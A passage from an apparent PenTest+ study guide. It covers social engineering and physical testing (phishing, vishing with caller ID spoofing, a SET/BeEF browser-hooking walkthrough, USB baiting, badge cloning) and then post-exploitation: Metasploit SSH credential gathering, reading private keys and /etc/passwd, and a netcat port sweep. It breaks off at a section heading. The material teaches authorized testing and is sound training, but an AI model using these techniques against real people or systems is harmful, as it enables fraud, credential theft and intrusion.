Up to this point, we have discussed how you can exploit and gain access to a target remotely using various tools, techniques, and methodologies. However, testing physical security measures is just as important, as physical controls are designed to protect personnel and property from harm. Secure services, firewalls, and network intrusion detection systems cannot provide protection when an attacker gains physical control of a device. Organizations may choose to use multiple layers of protection to reduce the risk of physical attacks like theft, sabotage, fraud, and vandalism, and accidents such as a natural disaster (e.g., earthquake).

Physical access into a facility may be protected by limiting physical access points and establishing entry detection mechanisms, deterrents, or access controls around those points. Access may be limited through the use of devices, such as barriers, locks, security guards, turnstiles, or entry vestibules, among others. Detection mechanisms may include measures such as human or technological surveillance, or alarms and sensors. Policies and procedures might add another layer of protection by establishing guest sign-in and sign-out processes, or consequences for authorized personnel who allow others unauthorized entry. Physical pentests are designed to test these controls.

That said, never underestimate the power of persuasion. Humans are often the weakest link in organizations with the strongest technical barriers and sophisticated security systems. As we learned in Chapter 2, a substantial amount of knowledge can be gained using open-source intelligence gathering techniques. Social engineering feeds off this information and is the belief that the human mind can be manipulated when you push the right buttons. In this chapter, we'll discuss social engineering methods and attacks, including physical attacks that use social engineering.

Physical Security and Social Engineering

An organization can implement multiple layers of physical security, including the following:

• Monitoring Surveillance, guards

• Detecting Closed-circuit television (CCTV) cameras, security alarms, sensors

• Preventing Physical barriers, lighting, mechanical or electronic locking mechanisms

Barbed wire, electricity, and signs can help accessorize a fence's security posture and help mitigate external breaches.

NOTE A perimeter barrier and an access control point are two other physical security protections to help delay an attack or reduce damage to the facility if the attacker is successful with penetration. More details on perimeter security can be found in Chapter 4, "Perimeter Security Design," from the Federal Emergency Management Agency (FEMA) (https://www.fema.gov) publication called FEMA 430, Site and Urban Design for Security: Guidance against Potential Terrorist Attacks (2007).

The National Institute for Standards and Technology (NIST) provides a set of standards that organizations can apply to their physical security needs. Some of these controls can be satisfied by reviewing the organization's policy documentation to ensure it satisfies the requirements of the control. Other controls may require an actual technical assessment of the control to ensure the implementation is effective. This is where physical penetration testing can be beneficial during an engagement.

NIST Special Publication 800-53 (Rev. 4) (https://nvd.nist.gov/800-53/Rev4) provides a list of information security controls that are relevant to federal information systems, as well as organizations in the private sector. The Physical and Environmental Protection (PE) control family identifies 20 unique controls relevant to physical security and the requirement(s) for how a control can be satisfied. For example, PE-3 Physical Access Control states that the organization needs to enforce physical access authorizations, that is, how will the organization meet the requirement to control access to internal and external entry points? An obvious answer could be a lock. The impact level for a control and how the organization would be affected should a breach occur will determine the complexity of the locking mechanism an organization puts on the door. Table 8-1 provides a list of PE controls and supplemental guidance taken from NIST Special Publication 800-53 (Rev.4).

Table 8-1 Physical and Environmental Protection Control Family

NOTE The Federal Information Processing Standard (FIPS) 199 (https://csrc.nist.gov/publications/fips) is a NIST publication that provides the standards for categorizing information and information systems based on impact levels. There are three impact levels: Low, Moderate, and High. Each level determines the loss of confidentiality, integrity, and availability to an organization should the control fail.

Disabling alarms or cameras, picking locks, jumping fences, and punching through a raised ceiling to circumvent a wall are all perfectly good examples of what you might do during a pentest, but we're going to focus on the social engineering aspects of physical pentesting for the exam. We will focus on methods a pentester will use on human targets to achieve pentest objectives. This may involve convincing a person to allow access through certain points, stealing access devices in order to gain entry, or taking advantage of other physical artifacts to gain intelligence about a target.

Pretexting and Impersonation

Social engineering is the process of convincing someone to do something for you that they might not ordinarily do or want to do. This may be as simple as getting someone to pay attention to an e-mail that they might otherwise dismiss as irrelevant or as complex as getting someone to bend (or break) a rule they know they should follow. Generally, people are less willing to pay attention or bend the rules when they have no reason to trust the request.

Trust might come from who the requester is, why they have made the request, or even the value of what they have requested. Consider, when your spouse asks you for money, you might be more willing to depart with it than if a stranger had made the request on the street. If a stranger makes the request, you might be less willing until you learn the reason for needing the money ("My daughter just threw up her lunch and my wife left me in line to pick up the order while she takes care of it, and I just realized she still has my wallet, and I'm a little short."). Similarly, you might care more if the request is for a thousand dollars than if it is only for some pocket change.

So, how would you convince a target they should do what you are asking them to do? What story would you need to convince them to trust you and abandon their inhibitions against taking the action? Who would you tell them you are and why should they take action? Answering these questions is part of how we establish a pretext.

Pretexting is a technique used to create a situation that may make a target more willing to comply with the needs of the social engineer. An example might be attempting to convince a security guard to allow you past an access point under the pretext that you are physically ill and need to use the private restroom urgently. The nature of your alleged predicament may drive sympathy (or even horror) in the guard, enough that they may be willing to bend the rule against allowing you through. We'll talk more about the methods of influence that social engineers use in the next section, but remember that the pretext is the situation or story that a social engineer uses to make a request plausible and build trust with a target in order to convince them.

Another technique designed to build trust is impersonation. Claiming to be a figure of authority or a famous person might give the target a reason to obey a request. More subtly, social engineers might attempt to get a target to open an e-mail from an address the target has never seen before by making it seem similar to an address they have seen. Perhaps a natural disaster has recently occurred and multiple aid organizations are seeking financial assistance for their efforts to help those affected. A target might not recognize a fictional aid organization, but the fact that they appear to be an aid organization might be enough to grab the target's attention. It's worth noting, this must be used carefully, however.

Impersonating certain individuals or organizations can be a criminal offense. For example, pretending to be a member of the law enforcement community or a federal agency is often illegal. Using the logo of a legitimate company in a phishing e-mail while claiming to be a representative of that company may break copyright laws. Of course, what constitutes criminal impersonation is governed by regional laws and may vary by location. In some cases, who or what is being impersonated is less important than the intent behind doing so. Assuming a false identity with the intent to defraud another, pretending to be another person or organization, or even opening bank and credit accounts under someone else's identity (otherwise known as identity theft) may all be illegal depending on the context and locale. Therefore, it is important to ensure that any type of social engineering attack used within a pentest is covered in the statement of work (SOW) and approved in the rules of engagement (RoE) prior to execution.

Methods of Influence

There are a number of ways to influence someone to get them to do what you want them to do. CompTIA has identified motivational techniques that can be used to exploit a target's trust. The Social Engineering Framework (https://www.social-engineer.org) provides definitions and examples for each type of influential tactic:

• Authority This can be performed in a legal (impersonating an officer of the law), organizational (impersonating a business leadership official), or social (dominant figure in a group of one's peers) leadership role to gain access to property or controlled information.

• Scarcity This can make something more desirable to a target. When time is made scarce, it can create a feeling of urgency to influence one's decision-making logic. False statements can be used to persuade someone to do something because it sounds important and there is little time to act, such as "This sale ends today. Act now before it's too late!"

• Social proof This describes a specific social phenomenon regarding outsiders seeking conformity based on group behavior. Think about a situation you've been in when you had absolutely no idea what was appropriate. You might have looked around to see what other people were doing. You assume they know what's going on, so you do what they do in order to conform and make it seem as though you weren't clueless. This is social proof.

• Likeness This approach takes advantage of the psychological concept that people are often more willing to help someone they like. This can be someone who is beautiful or familiar, or someone who provides plenty of flattery to the target. In essence, this is establishing rapport.

• Fear This approach attempts to strike fear into the target. An example would be using malware (scareware) to influence someone's decision to purchase or download fake antivirus programs or other software with malicious intent.

Social Engineering and Physical Attacks

Suppose for a moment that you are onsite and need access to a target network. You can't see the WLAN from anywhere outside the building. Remember, we talked about the range of wireless networks and the role of proximity in attacking them in Chapter 4. In this scenario, do you attempt to enter the building in order to get closer to the network? Do you attempt to convince someone to carry into the building a wireless attack device that can call back via a cellular connection? What if you are not onsite? How would you convince someone inside to run a payload using their access instead?

Social engineering attacks typically involve bypassing security controls by leveraging humans to aid with the attack. This may mean bypassing firewalls by convincing someone with insider access to execute a malicious payload, or it may mean bypassing physical controls by convincing a human to allow unauthorized ingress either for a person or a device. In this section, we'll talk about social engineering attacks that are covered within the CompTIA PenTest+ exam objectives, including phishing attacks, phone-based attacks, web attacks, and physical attacks such as dumpster diving, baiting, shoulder surfing, tailgating, and badge cloning.

Phishing Attacks

One of the most popular methods used for social engineering is phishing. This is a fraud technique delivered through e-mail, phone, or text message used to obtain sensitive information from the target. Pentesters can be hired to engage in phishing attack vectors to evaluate technical defense measures over the network, like spam filters for e-mail, web content filters, firewalls, and other types of access control devices. They can also help validate employee behavior patterns to report and respond to the threat, as well as a controlled compromise method to gain an initial foothold into an organization's network. During a phishing assessment, the number of successful interactions with a payload, the number of people who open an e-mail, or other information about goal attainment resulting from the attack may be tracked for reporting.

E-mail Attacks

The three main characteristics of an e-mail phishing attack are targeting, pretext, and payload. Targeting refers to who receives the phishing e-mail. The pretext is the situation created by the e-mail, including the relationship between the attacker and the intended target. The payload is the method an attacker will use to accomplish attack objectives.

In the wild, attackers tend to perform opportunistic or tailored attacks against their targets. An opportunistic attack involves crafting the broadest possible pretext and sending it indiscriminately to as many targets as possible in the hope that one or more will take action based on the mail. These target lists may be randomly generated based on common names and known domains (such as Gmail). Pretexts vary from an assumed personal relationship to impersonating a company soliciting business, but do not typically include information that is tailored to the individual targets. Payloads are often generic without consideration for the target's specific operating system or security controls. Modern security controls are somewhat adept at detecting these opportunistic attacks, meaning that pentesters tend to get better results with tailored approaches. In a tailored approach, target lists are derived from intelligence gathering or may be provided by the customer in the case of a pentest. Pretexts include information from research into the targets. This may include names, job titles, or even personal interests that are relevant to targeted individuals. Payloads may consider the security controls or software the target uses based on reconnaissance activities.

Before we dig deeper into tailored attacks, understand that phishing via e-mail typically has one of three objectives: establishing rapport, gathering information, or delivering malicious content for execution. Establishing rapport with the target by using an exchange of multiple conversational e-mails may set up the target to take subsequent actions on behalf of the attacker. One example is convincing the target to make a financial transaction to the attacker. This is popularized by the common 419 scam.1 In pentesting, red teams might use this method to bypass spam filtering mechanisms by starting an e-mail conversation and including no attachments, links, or other active content that would arouse the suspicion of automated security controls. Impersonating a potential customer or a job seeker in order to get more information about the company would be a valid pretext and objective for this sort of attack. Information gathering can be done with this same sort of back-and-forth exchange, or it can be done programmatically using payloads. Payloads may attempt to gather credentials by using document or web forms, for example, or they may allow an attacker to collect system or network information. If a user clicks on a payload that includes a link to a web page controlled by the pentester, the pentester may be able to learn more about the proxies the organization is using, the browser type, and even the habits of the users who are targeted based on when they click on the message. Other malicious payloads may attempt to establish a foothold in the environment by executing exploits once a user opens a message or otherwise interacts with the content of that message.

Now that we've talked generally about phishing objectives, there are generally two types of tailored attacks: spear phishing and whaling. Spear phishing uses information about the organization or the individual to attempt to bypass security controls and establish a pretext that is likely to convince the user. The target user may be anyone within the company. Whaling, on the other hand, targets members of the organization who have elevated authority, such as executives or executive assistants. Successful compromise of these targets can allow attackers to abuse chains of trust, which can cascade into much broader impacts throughout the organization. If your boss's boss's boss sends you an e-mail and tells you to do something, would you?

In order to perform these kinds of attacks as a pentester, you will want to know as much as possible about the target organization's security controls. If your payload never reaches its intended target, you won't achieve your objectives. Whether you get this information from your client during pentest planning discussions or whether you gather it during reconnaissance, you'll want to know enough about security controls to adjust your payloads and e-mail delivery mechanisms to reach your targeted individuals. E-mail attacks typically follow this path:

• Gather intelligence, including targets, security controls, and information for pretexting.

• Create a payload based on the gathered intelligence, considering controls and pretext especially.

• Craft an e-mail containing a valid pretext for delivery of the payload.

• Set up an e-mail infrastructure to send the mail, including mail servers, domains, and other hosting if necessary.

• Set up a call-back infrastructure, such as web servers, C2s, or others.

NOTE This blog goes into some of the details about security control considerations and setup for your mail services if you choose to use your own domain and server for phishing: https://www.ired.team/offensive-security/red-team-infrastructure/smtp

Phone-Based Attacks

A pentester calls a phone number on the agreed-upon target list and reaches an employee in the sales department. The pentester introduces themselves as "Sam, from the help desk" and says the company is running a new pilot program for a remote virtual private network (VPN) solution and the employee has been chosen for the pilot. In order to make sure all goes well on the day the pilot starts, the help desk needs the employee to make sure they can access the pilot VPN portal with their login credentials. The employee types into a browser the web address that the pentester provides over the phone and gets a web page that looks like the company-branded web pages, it says something about VPN, and it has a login screen. The employee enters their username and password, and the pentester collects it from the web server they control. This technique of social engineering over the phone is sometimes called vishing.

Like other social engineering schemes, the goal may be to gather additional information or execute payloads designed to grant access to the attacker. Examples of target information might include unpublished phone numbers, business partner names, or details of pending business deals. Either way, the initial vector of attack can be via phone, SMS messaging, or voicemail. In the case of SMS (sometimes called SMiShing) or voicemail, the attack may be designed to set up further communication by getting the target individual to call back the attacker or to encourage the target to visit a website. In order to perform these attacks as a pentester, it is helpful to have an understanding of the target individual's knowledge, a grasp of normal business terminology, and maybe caller ID spoofing technology.

CAUTION Caller ID spoofing may be illegal in some places and under some circumstances. In the United States, caller ID spoofing is legal unless it is used to defraud, harm, or wrongly obtain anything of value, according to the Truth in Caller ID Act. Be certain the terms of your use for caller ID spoofing are defined in your pentest contracts and authorized accordingly. You can read more about caller ID spoofing in the United States at the Federal Communications Commission (FCC) website: https://www.fcc.gov/spoofing#:~:text=When%20is%20spoofing%20illegal%3F,to%20%2410%2C000%20for%20each%20violation

Knowing a little about the individual will be helpful if you are targeting specific kinds of information beyond user credentials that everyone may have. Asking someone from manufacturing about accounting details may be less successful than asking someone in accounting. Additionally, you may be able to build rapport using shared interests. If you know about a person's hobbies and you can work them into the conversation, you might be able to get the person to warm up to you enough that they ignore some of their inhibitions or don't realize when the topic changes. Generally, you can tune your questions and interactions according to your target.

Speaking of tuning your interactions according to your target, every company has its own brand of internal jargon. The bigger the company, the more likely the language will be specific to that organization. Knowing and using those terms in the pretext may build the necessary trust to compel a target to cooperate. On the other hand, an organization that trains employees to confirm any form of phone contact from an authority by using an internal instant messaging system will likely be harder to crack with a pretext based on impersonating an internal authority.

In many corporate environments, business phones show the name and extension of the person calling on the phone itself. The same is true for cell phones. Using caller ID spoofing services to make a call from the same area code or to present a name associated with your impersonated identity may add credence to your pretext. Numerous commercial services will allow you to do this, including smart phone applications that allow you to use temporary phone numbers (burners) and IDs for phone and text messages. Many of these rely on Voice over IP (VoIP) technology. A protocol that some of these use is called Session Initiation Protocol (SIP). It is possible to take advantage of phone systems that are configured to allow anonymous SIP INVITE requests and use tools like Metasploit and Viproy (http://www.viproy.com/) to create a spoofed caller ID, even from a number that doesn't exist.

NOTE Rapid7 has a blog series that walks you through manual configuration of a caller ID spoofing system if you don't choose to use an existing service: https://www.rapid7.com/blog/post/2018/05/24/how-to-build-your-own-caller-id-spoofer-part-1/

Other Web Attacks

We discussed using a web resource for phishing attempts earlier in the chapter, but there are other web-based attacks CompTIA places in the category of social engineering for the PenTest+ exam. A watering hole attack capitalizes on a target's trust relationship with websites they commonly visit. In this attack, an attacker observes the websites a target frequents and infects one of the sites with malware. This is an advantageous way of targeting, since the attacker already knows the targets will visit the website, so it's just a matter of time before successful exploitation. If you use this tactic during a pentest, you should be very careful to observe appropriate guardrails to avoid infecting visitors to the site outside of your targeted organization. Guardrails might use system characteristics, such as the origin IP address or an organization-specific registry key, to prevent accidentally targeting a system that is outside of the pentest scope.

Social Engineering Tools

The Social-Engineer Toolkit (SET) (https://www.trustedsec.com/social-engineer-toolkit-set/) is an open-source, Python-based framework for social engineering. It is available by default in Kali Linux. As we discussed earlier in this chapter, a social engineering attack may include the use of a web page to collect credentials or execute payloads when visited by a target. SET helps with that by providing the technology components to spoof e-mails, receive web requests, and serve payloads in the context of a social engineering attack. The Browser Exploitation Framework, or BeEF (http://beefproject.com/) is another tool that may be useful for web-based attacks using social engineering. BeEF focuses on client-side attacks against web browsers. Using SET and BeEF together offers a comprehensive testing framework for carrying out phishing-based attacks.

Follow along as we explore a basic technique for using SET and BeEF together to hook a target's web browser, where additional attacks can be launched within the browser, using BeEF command modules. The following basic items are recommended for the exercise:

• Updated version of Kali Linux for the attack system

• A test Google account for receiving e-mail

• A web browser on a target system

• Internet access for both the attack and target systems

1. The first step is to identify your targets from the RoE and build a target list. In this example, we will be targeting one e-mail address. Open up SET and at the set\> menu prompt, select option 1, Social-Engineering Attacks.

2. At the next set\> menu prompt, select option 5, Mass Mailer Attack.

3. At the set:mailer\> prompt, select option 1 to send an e-mail to a single e-mail address.

4. In this example, we will be sending the e-mail to an account that we own. The next step is to build out your phishing e-mail template. To do so, you set up where the e-mail will originate from (Gmail), the TO line, the FROM NAME, and the body of the message. In the following illustration, you will see the message is trying to intrigue the target into checking out the new sales page from "customerservice." Once you type END and press RETURN at your final set:phishing\>, you will launch the campaign and the message will be e-mailed to your target.

5. In order for the attack to work, we need to create a web page for the user to browse to after clicking on the link. The page will have an embedded JavaScript tag that will load the BeEF JavaScript code (hook.js) to hook the browser into the framework. Launch BeEF, open up a terminal window, change the directory to /tmp, and edit the index.html. Shown next is a basic HTML page we can use to serve the target when landing on the page.

6. Then save and exit the vi editor and use Python with the SimpleHTTPServer module to host the web page from the /tmp directory on port 80.

7. Now open the e-mail from "customerservice" to see what kind of a sale you might be missing out on.

8. When clicking on the link inside the e-mail, you should be redirected to the web page we created in step 5.

9. If you look in the terminal window where you launched the SimpleHTTPServer in step 6, you will see the HTTP GET request from the target IP, and if successful, the hook.js will be executed and you will see the IP address of the target show up in the Hooked Browser section of BeEF.

10. When the browser is online, you can execute BeEF command modules to attack the target's computer through the web browser.

Dumpster Diving

Dumpster diving is a physical attack used in social engineering. It involves digging through an organization's dumpster or trash in order to retrieve sensitive information. Some organizations don't do as much to protect their trash as other elements of their business, so pentesters may find information that may or may not have been destroyed, such as by shredding. Once something is placed in the trash and put out for collection, it's often legally fair game. Although organizations might use a secure data destruction service or implement additional controls, such as locks or fences, to protect waste from unauthorized access. Therefore, you may need to circumvent some physical control to get access to this information. With success, you might find usernames, policies, passwords, software, account information, financial statements, or meeting notes. Knowing about business partners or what technology the organization uses can help with the pretexting process or identify other avenues of attack.

USB Dropping

Baiting is a procedure used to lure a target into doing something using a tangible reward. An example would be dropping a USB device or CD labeled "company financial data." The idea is to spark the curiosity of the target in order to persuade him or her to introduce the device into the inside of the environment for you. They might insert the device and automatically launch a keylogger or malware that grants you access.

If you gain physical access to one or more computing assets within the facility, you could also personally introduce a USB keylogger. In this case, it would be a transparent device positioned in-line with a computer keyboard and the USB port of a computer or even installed inside the keyboard itself. You may similarly insert it into the computer and rely on autorun to run any number of malicious things on a system, including installing a keylogger. A keylogger will record the user's keystrokes and record the data to a text file, which can either be physically retrieved or exfiltrated electronically. Some USB keyloggers have Wi-Fi capability and act as a hotspot. This offers a more convenient method for data retrieval, as the keylogged data can be downloaded remotely. Keelog (https://www.keelog.com) manufactures all types of USB and serial-based (for serial consoles) keylogging products to help support your testing needs

Shoulder Surfing

Shoulder surfing is a physical attack using an observation technique where an attacker pretends to do something else while instead observing what a target is doing, such as typing in a password. This attack requires close proximity to the human target with the objective of stealing sensitive information while remaining unobserved. This attack need not necessarily be combined with other attacks to gain proximity, as it could be conducted against targets operating in a public place.

Tailgating

Tailgating is a type of physical attack that can be combined with a social engineering technique to bypass physical access controls in order to gain unauthorized access to a restricted area. This is accomplished by an unauthorized person walking in through the door behind an authorized employee with legitimate access. This may be with their consent or without it. In the case where the target notices, a pentester might attempt to generate consent by saying something like, "Sorry about that, I am new here and left my badge at my desk. I really appreciate your help."

As referenced in Table 8-1, NIST PE-3 is a testable control wherein during an engagement, the pentest team may be able to social-engineer the security guard at the front desk into letting them into the facility by bribing the guard or using diversion techniques. Depending on the outcome of testing, a mitigation may need to be applied for corrective action, such as training or finding a new guard who is less likely to fall victim to social engineering techniques.

Badges

PE-2 would also be a testable control. If the pentest team were able to compromise a radio frequency identification (RFID) key from a legitimate employee, then clone the key and use it to impersonate the employee, the pentest team would be able to exploit the employee's accesses throughout the facility.

As we discussed in Chapter 4, RFID devices can be cloned by reading their data and writing the same data to another compatible card. When RFID cards are used as access devices, physical attacks will often center around gaining the proximity necessary to perform the capture of the RFID information. Remember, these devices may have a range as low as a few centimeters or as high as a couple of feet. Social engineering physical attacks might involve engaging the target in conversation in order to maintain proximity during the cloning process or applying tactics to gain access using a cloned card. For example, a normal card may have a company logo or photo of the employee. If you look nothing like the employee whose badge you cloned, will that cause a problem if the security guard notices? What if something about the cloning process doesn't work and you find yourself rejected at the door? These are all cases where other social engineering techniques may come into use.

Basic Physpen Tools

During a physical pentest, you will want to make sure you have the tools necessary to evaluate the implementation weaknesses within your customer's physical security protections. This may include USB drives, badge cloning devices, and devices to bypass door lock mechanisms. A basic lock kit provides some essential tools necessary to defeat the security mechanisms in most standard locks, including a tension wrench, a lock pick, and possibly even a bump key. Figure 8-1 shows a basic lock-picking kit that you can purchase for under $20 USD, with the exception of the bump keys, which are typically made using a key cutting machine. But the most important tool you should have is your written authorization for testing.

![](RackMultipart20240405-1-nwk5q_html_6f863f11237ac77b.png)

Figure 8-1 A basic lock-picking kit

CAUTION Lock bumping can not only damage a lock but is considered illegal in some parts of the United States (and parts of the world, for that matter). It is illegal in some states to even possess lockpick kits. In others, it is only legal to possess them if you are a licensed locksmith. The Open Organization of Lockpickers (TOOOL) is a resource available to those who want to advance their knowledge about locks and lockpicking. Their website provides a good starting point to find out if lock picking is legal or illegal in your state (https://toool.us/laws.html).

Countermeasures

There are a number of mitigations organizations can use to thwart risks associated with social engineering attacks, including:

• Security training and validation of trust (trust but verify)

• Fine-tuning technological controls

• Active defense (intrusion detection and prevention systems) and security monitoring (cameras for dumpster diving)

• Shredders for sensitive information (i.e., papers and CDs, etc.)

• Organizational policy for handling sensitive information

Annual testing is another effective countermeasure that can help prepare organizations for various types of phishing attacks. GoPhish (https://getgophish.com) is a phishing framework used to test an organization's exposure to phishing. You can create phishing templates, target lists, and track results in an online dashboard. Pentesters can use this type of framework to test and evaluate phishing methods in a controlled environment. Figure 8-2 shows an example of how to track e-mails sent and opened, links clicked, and submitted data when using web forms for web pages.

Figure 8-2 GoPhish – Phishing success overview

Chapter Review

Physical security plays an important role in the organization's overall security program. But people are one of the biggest threats to security. Social engineering can be an effective means to bypass security guards or piggyback through a doorway. Organizations with a requirement for a defense-in-depth physical security system should include multiple layers of protection. Exterior fencing, barriers, locks, and even early warning detection and surveillance systems can help keep even the honest person honest.

Social engineering is an effective method of testing an organization's initial lines of defense. Many motivational techniques can be used to influence a target's decision-making skills and entice them to do something you want them to do. Phishing is a popular method of social engineering that can be delivered through voice, SMS messages, or e-mail. A number of countermeasures can help protect and prepare organizations for social engineering attacks. Annual training and testing is a way to help evaluate how susceptible an organization is to social engineering and provides the ability to track results and apply additional training in areas that need improvement.

9. A. The Physical and Environment Security controls found in NIST SP 800-53 (rev 4) offer supplemental guidance on how a control can be assessed. In some cases, the control can be assessed by reviewing a policy control document. If the policy provides substantial evidence that the control is implemented, the control is satisfied. However, some controls can be assessed from a technical perspective, where the assessment is done against the security control mechanism to determine its effectiveness and identify any implementation weaknesses that may need to be mitigated.

## Chapter 9: Post-Exploitation

In this chapter, you will learn about

• Completing various exercises using post-exploitation tools

• Performing lateral movement attacks like pass the hash

• Investigative techniques to move laterally over the network

• Discovering ways to maintain persistence and avoid detection

• Exploring post-exploitation techniques for privilege escalation and enumeration

So far in this book, we have covered different ways to exploit network, application, and human vulnerabilities to gain access. In this chapter, we will investigate attack techniques that you can use once you have an initial foothold into a system. These are called post-exploitation techniques. There are an abundance of post-exploitation techniques for Mac, Linux, and Windows. However, we will focus on scenarios and tooling from the CompTIA exam objectives. This includes tools and techniques for privilege escalation and trust abuse, lateral movement, detection avoidance, and post-exploitation information gathering techniques.

Enumeration

Once you gain initial access to the target's operating system, you will want to have a better understanding of the environment in order to determine your next steps toward achieving your pentest objectives. You'll want to figure out more about the system you have accessed, including users, groups, domains or domain trusts, and other systems it's connected to on the network. In addition, you'll want to make a survey of existing files and folders in case you have access to sensitive data.

TIP Metasploit Unleashed (https://www.offensive-security.com/metasploit-unleashed) is a free online hacking tutorial offered through Offensive Security. Many of the Metasploit examples we will discuss in this chapter are covered in this tutorial, along with examples of how to leverage the Metasploit framework post-exploitation modules to harvest credentials, enumerate sensitive data from remote and local shares, escalate privileges to a higher privileged account, etc. Visit their website and follow the tutorials to learn additional exploitation and post-exploitation techniques using the Metasploit framework.

Discovery

MITRE ATT&CK describes the process of figuring out more about the environment under the Discovery Tactic. In the Enterprise Matrix, which addresses Windows, Linux, and macOS systems, MITRE enumerates 27 techniques based on observations of threat actors in the wild. These include ways to identify whether or not you are in a virtual machine, sandbox, or deception environment; enumerating the contents of network shares; identifying users, domains, and other systems on the network; and examining systems settings and installed applications for useful data, among others. In short, you are searching for data according to your pentest objectives and gathering tools you can use to get closer to your goal.

Files

Let's talk about some of the things you might look for in files. Network shares and local files may contain password vaults, credentials in plaintext, or other target data. You may be able to crack password vaults offline if you are able to exfiltrate them. Bookmark files may contain sites that are login portals to other applications or repositories for stored information (like SharePoint or wikis).

You may want to look for SSH keys (often stored in the $HOME/.ssh directory in Linux/Mac), or look for configuration files for remote access programs, such as PuTTY. These may store information about other systems to connect to (such as in the $HOME/.ssh/known\_hosts file), or enable you to access them without additional passwords. If you managed to harvest some valid SSH usernames and passwords during post-exploitation activities, you can leverage those accesses to potentially dig a little deeper into the network. Let's take a minute to talk through this as an example.

Public key authentication is an alternative to password-based logins that can be used to validate the identity of the SSH client making the connection, as well as the individual user account. It provides stronger encryption and can eliminate the need for users to enter in passwords each time they log in, using SSO across SSH servers with the use of SSH agents. The public (id\_rsa.pub or id\_dsa.pub) and private (id\_rsa or id\_dsa) key pair will be saved to the user's $HOME/.ssh directory. To see if an SSH key is encrypted, you can use the openssl command (rsa syntax: openssl rsa -in id\_rsa). If the key is not encrypted, you will not be prompted for a password and the plaintext value of the key will be printed to the screen.

To use SSH key login with OpenSSH, copy the contents of id\_rsa.pub into the $HOME/\<user\>/.ssh/authorized\_keys file. The public key entry is used to validate the private key presented by the \<user\> account during the login process. This happens on the server side, not the client side.

Metasploit has a few modules to assist with SSH hijacking and exploitation. The auxiliary/scanner/ssh/ssh\_login module can be used to validate credentials against remote SSH servers. The services command in Metasploit will list ports, protocols, and hosts that it knows about. The -R feature will tell Metasploit to populate the RHOSTS field in the current module with the hosts from the services table.

When you run the ssh\_login module, it will attempt to log in to the remote hosts using the username and SSH password you configured the module to use. As you can see in Figure 9-1, one of four target hosts were able to be logged in to using the provided username and password combination. The module will execute a basic shell payload against the target host, which can be converted to a Meterpreter payload, using the ssh\_to\_meterpreter post-execution module.

Figure 9-1 Metasploit SSH login scanner

TIP A shell upgrade in Metasploit is the opportunity to convert the existing shell to a Meterpreter. The shell platform is automatically detected and the best version of Meterpreter for the target is used as the payload option, unless otherwise specified. The supported platforms are Linux, OS X, Unix, Solaris, BSD, and Windows. The Metasploit post-exploitation payload to use against your session is called "post/multi/manage/shell\_to\_meterpreter."

Using the newfound shell from the target, we can use the Metasploit post-execution module called multi/gather/ssh\_creds to try and gather SSH credentials from the target host, such as SSH private keys from the target file system that our user account may have access to, like the compromised user's $HOME/.ssh directory. As shown in Figure 9-2, to run the module, simply set the SESSION identifier and execute run.

Figure 9-2 Gather SSH credentials

As you can see, the "user" account had an SSH private key accessible in their $HOME directory. The next step is to see if the private key is unencrypted. If it is, we won't need to figure out the password used to decrypt it. We see that the authorized\_keys file is being used, so we can compare the public key to the authorized key file to see if it is a match, and if so, we can compare the compromised private key to the public key to see if this is indeed a key used to authenticate the user for the remote host. To verify that a public and private key pair match, you can use the following command syntax: ssh-keygen -y -f \<private key\> then read the contents of the public key (e.g., id\_rsa.pub) to verify. The last step is to see which hosts we can identify from the known\_hosts file. This will list the SSH host key of other SSH servers that the user has connected to, which could provide a digital footprint of potential targets. If the credentials work against those hosts, you could simply walk in the digital footprints of the compromised user to reduce the likelihood of being detected, while emulating normal behavior on the network.

NOTE Metasploit modules will record all discovered artifacts in the Loot table and save recovered files from target hosts to the appropriate Metasploit user folder on your local file system. You can access these discovered artifacts in Metasploit using the loot command.

The Metasploit post-execution module scanner/ssh/ssh\_login\_pubkey is used to validate SSH keys against remote SSH servers. Using the compromised user key, we can attempt to log in to the other three hosts we failed to authenticate against using the password. This could tell us if the user has different local passwords but uses the same SSH key for authentication.

After running the module, you can see in Figure 9-3 that the user account used the compromised public key for authentication on two of the four hosts. The Metasploit creds command prints valid credentials from the Credentials table that have been either verified through other Metasploit modules or collected from post-execution modules.

Figure 9-3 Displaying SSH credentials in Metasploit

System Configuration

System configuration data may also be useful. For example, what processes are running on the system? What permissions do they have? You can use this information to migrate unstable shells into more stable processes or elevate privileges by impersonating the user who owns the process. This can also tell you what applications are running on the system, including security controls you may need to evade. In Linux and macOS, you can use the ps command to list processes on the system. In Windows, you can use the tasklist command, or the Get-Process cmdlet in PowerShell, if you have elevated rights.

powershell Get-Process -IncludeUserName

Users and Groups

Once you know the users on the system, you can look at the groups they belong to or find other users to target. In Linux, you can use cat /etc/passwd or getent passwd to list all users on a system. In Windows, you can use net commands, such as net user. Adding the /dom flag will list domain users. Or, you can look at a specific user's properties: net user \<username\> /dom. Accounts with privileged access or service principal names may be of special interest because of the access they give. Read more about this under the "Credential Access" section later in this chapter. Group memberships are included in the user information, but you can also query groups with the net group and net localgroup commands in Windows. In macOS, you can use dscacheutil -q group or dscl . -list /Groups to see a list of all the local groups. The Linux ldapsearch command can search LDAP for domain groups. Linux can identify local groups using the id -a or groups command. To show a full listing of the local groups and group memberships, you can execute cat /etc/group at the terminal.

Tools such as Bloodhound are designed to visualize Windows Active Directory environments in order to find pathways for lateral movement. Using this tool, you can perform quick queries to identify the shortest path to domain administrator, for example. It's worth noting, however, that in very large directory environments, Bloodhound may take a very long time to run, and it is not a stealthy method of enumeration. Figure 9-4 shows the Bloodhound GUI.

Figure 9-4 Bloodhound

NOTE For further reading, Raphael Mudge does a great walkthrough of a practical use case for Bloodhound here: https://www.youtube.com/watch?v=gOpsLiJFI1o

Network Connections

Look for other hosts the system is connected to, especially if the system has multiple network interfaces, such as the following. Systems that bridge network segments can be valuable targets for lateral movement. The ipconfig /all command in Windows and the ifconfig -all command in Linux and Mac can be used to list network interfaces, while the netstat command will list all open and listening network connections on the device.

Local command utilities such as net view for Windows or ping can be used to determine if other internal targets are alive on the network. In Linux, telnet or netcat may even be installed, which could allow you to evaluate the state of various common ports over the network using the -z command option:

nc -z 192.168.1.50 1-1000

Credential Access

Once you identify targets, there are numerous ways you may attempt to get credentials in order to access other systems. For example, you could attempt to dump them from memory using a tool like Mimikatz. You could even create a faux login page (perhaps by using the "phish\_windows\_credentials" post-exploit module in Metasploit), then attempt to use a keylogger to capture keystrokes as an active user logs into a remote system. Even the clipboard may contain data copied from a password vault before it is pasted into a login prompt. Let's dig more into some ways to get credentials.

Windows: Group Policy Preferences

